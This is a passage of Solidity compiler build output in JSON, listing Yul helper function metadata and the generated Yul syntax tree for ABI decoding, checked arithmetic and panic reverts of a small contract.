								},
								"abi_decode_t_bool": {
									"entryPoint": 294,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_bool": {
									"entryPoint": 315,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_t_bool_to_t_bool_fromStack": {
									"entryPoint": 360,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_t_uint256_to_t_uint256_fromStack": {
									"entryPoint": 375,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed": {
									"entryPoint": 390,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed": {
									"entryPoint": 417,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"allocate_unbounded": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"checked_div_t_uint256": {
									"entryPoint": 444,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"checked_sub_t_uint256": {
									"entryPoint": 493,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"cleanup_t_bool": {
									"entryPoint": 545,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint256": {
									"entryPoint": 557,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"increment_t_uint256": {
									"entryPoint": 567,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"panic_error_0x11": {
									"entryPoint": 640,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"panic_error_0x12": {
									"entryPoint": 687,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
									"entryPoint": 734,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"validator_revert_t_bool": {
									"entryPoint": 739,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:2782:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "56:84:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "66:29:1",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "88:6:1"
																	}
																],
																"functionName": {
																	"name": "calldataload",
																	"nodeType": "YulIdentifier",
																	"src": "75:12:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "75:20:1"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "66:5:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "128:5:1"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_bool",
																	"nodeType": "YulIdentifier",
																	"src": "104:23:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "104:30:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "104:30:1"
														}
													]
												},
												"name": "abi_decode_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "34:6:1",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "42:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "50:5:1",
														"type": ""
													}
												],
												"src": "7:133:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "209:260:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "255:83:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nodeType": "YulIdentifier",
																				"src": "257:77:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "257:79:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "257:79:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "230:7:1"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "239:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "226:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "226:23:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "251:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "222:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "222:32:1"
															},
															"nodeType": "YulIf",
															"src": "219:119:1"
														},
														{
															"nodeType": "YulBlock",
															"src": "348:114:1",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "363:15:1",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "377:1:1",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "367:6:1",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "392:60:1",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "424:9:1"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "435:6:1"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "420:3:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "420:22:1"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "444:7:1"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_bool",
																			"nodeType": "YulIdentifier",
																			"src": "402:17:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "402:50:1"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "392:6:1"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "179:9:1",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "190:7:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "202:6:1",
														"type": ""
													}
												],
												"src": "146:323:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "534:50:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "551:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "571:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_bool",
																			"nodeType": "YulIdentifier",
																			"src": "556:14:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "556:21:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "544:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "544:34:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "544:34:1"
														}
													]
												},
												"name": "abi_encode_t_bool_to_t_bool_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "522:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "529:3:1",
														"type": ""
													}
												],
												"src": "475:109:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "655:53:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "672:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "695:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_uint256",
																			"nodeType": "YulIdentifier",
																			"src": "677:17:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "677:24:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "665:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "665:37:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "665:37:1"
														}
													]
												},
												"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "643:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "650:3:1",
														"type": ""
													}
												],
												"src": "590:118:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "806:118:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "816:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "828:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "839:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "824:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "824:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "816:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "890:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "903:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "914:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "899:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "899:17:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bool_to_t_bool_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "852:37:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "852:65:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "852:65:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "778:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "790:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "801:4:1",
														"type": ""
													}
												],
												"src": "714:210:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1028:124:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1038:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1050:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1061:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1046:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1046:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1038:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "1118:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1131:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1142:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1127:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1127:17:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1074:43:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1074:71:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1074:71:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1000:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1012:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1023:4:1",
														"type": ""
													}
												],
												"src": "930:222:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1198:35:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1208:19:1",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1224:2:1",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "1218:5:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1218:9:1"
															},
															"variableNames": [
																{
																	"name": "memPtr",
																	"nodeType": "YulIdentifier",
																	"src": "1208:6:1"
																}
															]
														}
													]
												},
												"name": "allocate_unbounded",
												"nodeType": "YulFunctionDefinition",
												"returnVariables": [
													{
														"name": "memPtr",
														"nodeType": "YulTypedName",
														"src": "1191:6:1",
														"type": ""
													}
												],
												"src": "1158:75:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1281:143:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1291:25:1",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1314:1:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1296:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1296:20:1"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "1291:1:1"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1325:25:1",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1348:1:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1330:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1330:20:1"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "1325:1:1"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1372:22:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x12",
																				"nodeType": "YulIdentifier",
																				"src": "1374:16:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1374:18:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1374:18:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1369:1:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "1362:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1362:9:1"
															},
															"nodeType": "YulIf",
															"src": "1359:35:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1404:14:1",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1413:1:1"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1416:1:1"
																	}
																],
																"functionName": {
																	"name": "div",
																	"nodeType": "YulIdentifier",
																	"src": "1409:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1409:9:1"
															},
															"variableNames": [
																{
																	"name": "r",
																	"nodeType": "YulIdentifier",
																	"src": "1404:1:1"
																}
															]
														}
													]
												},
												"name": "checked_div_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "1270:1:1",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "1273:1:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "r",
														"nodeType": "YulTypedName",
														"src": "1279:1:1",
														"type": ""
													}
												],
												"src": "1239:185:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1475:146:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1485:25:1",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1508:1:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1490:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1490:20:1"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "1485:1:1"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1519:25:1",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1542:1:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1524:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1524:20:1"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "1519:1:1"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1566:22:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "1568:16:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1568:18:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1568:18:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1560:1:1"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1563:1:1"
																	}
																],
																"functionName": {
																	"name": "lt",
																	"nodeType": "YulIdentifier",
																	"src": "1557:2:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1557:8:1"
															},
															"nodeType": "YulIf",
															"src": "1554:34:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1598:17:1",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1610:1:1"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1613:1:1"
																	}
																],
																"functionName": {
																	"name": "sub",
																	"nodeType": "YulIdentifier",
																	"src": "1606:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1606:9:1"
															},
															"variableNames": [
																{
																	"name": "diff",
																	"nodeType": "YulIdentifier",
																	"src": "1598:4:1"
																}
															]
														}
													]
												},
												"name": "checked_sub_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "1461:1:1",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "1464:1:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "diff",
														"nodeType": "YulTypedName",
														"src": "1470:4:1",
														"type": ""
													}
												],
												"src": "1430:191:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1669:48:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1679:32:1",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1704:5:1"
																			}
																		],
																		"functionName": {
																			"name": "iszero",
																			"nodeType": "YulIdentifier",
																			"src": "1697:6:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1697:13:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "1690:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1690:21:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1679:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1651:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1661:7:1",
														"type": ""
													}
												],
												"src": "1627:90:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1768:32:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1778:16:1",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "1789:5:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1778:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1750:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1760:7:1",
														"type": ""
													}
												],
												"src": "1723:77:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1849:190:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1859:33:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1886:5:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1868:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1868:24:1"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "1859:5:1"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1982:22:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "1984:16:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1984:18:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1984:18:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1907:5:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1914:66:1",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "eq",
																	"nodeType": "YulIdentifier",
																	"src": "1904:2:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1904:77:1"
															},
															"nodeType": "YulIf",
															"src": "1901:103:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "2013:20:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "2024:5:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2031:1:1",
																		"type": "",
																		"value": "1"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "2020:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2020:13:1"
															},
															"variableNames": [
																{
																	"name": "ret",
																	"nodeType": "YulIdentifier",
																	"src": "2013:3:1"
																}
															]
														}
													]
												},
												"name": "increment_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1835:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "ret",
														"nodeType": "YulTypedName",
														"src": "1845:3:1",
														"type": ""
													}
												],
												"src": "1806:233:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2073:152:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2090:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2093:77:1",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2083:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2083:88:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2083:88:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2187:1:1",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2190:4:1",
																		"type": "",
																		"value": "0x11"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2180:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2180:15:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2180:15:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2211:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2214:4:1",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "2204:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2204:15:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2204:15:1"
														}
													]
												},
												"name": "panic_error_0x11",
												"nodeType": "YulFunctionDefinition",
												"src": "2045:180:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2259:152:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2276:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2279:77:1",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2269:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2269:88:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2269:88:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2373:1:1",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2376:4:1",
																		"type": "",
																		"value": "0x12"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2366:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2366:15:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2366:15:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2397:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2400:4:1",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "2390:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2390:15:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2390:15:1"
														}
													]
												},
												"name": "panic_error_0x12",
												"nodeType": "YulFunctionDefinition",
												"src": "2231:180:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2506:28:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2523:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2526:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "2516:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2516:12:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2516:12:1"
														}
													]
												},
												"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
												"nodeType": "YulFunctionDefinition",
												"src": "2417:117:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2629:28:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2646:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
